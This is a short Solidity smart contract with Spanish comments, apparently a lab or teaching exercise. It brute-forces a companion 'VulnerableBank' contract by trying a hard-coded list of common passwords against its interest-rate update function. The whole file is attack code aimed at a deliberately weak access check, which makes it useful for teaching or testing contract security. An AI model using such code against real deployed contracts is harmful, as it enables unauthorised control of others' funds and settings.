// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "./VulnerableBank.sol";

contract PasswordCracker {
    VulnerableBank public vulnerableBank;

    // Lista de posibles contraseñas
    string[] private commonPasswords = ["password", "123456", "123456789", "qwerty", "abc123", "password1"];

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
    }

    // Función para intentar cambiar la tasa de interés probando las contraseñas comunes
    function crackPassword(uint256 newInterestRate) public {
        for (uint256 i = 0; i < commonPasswords.length; i++) {
            try vulnerableBank.updateInterestRate(newInterestRate, commonPasswords[i]) {
                // Si tiene éxito, terminar la función
                break;
            } catch {
                // Si falla, continuar con la siguiente contraseña
                continue;
            }
        }
    }
}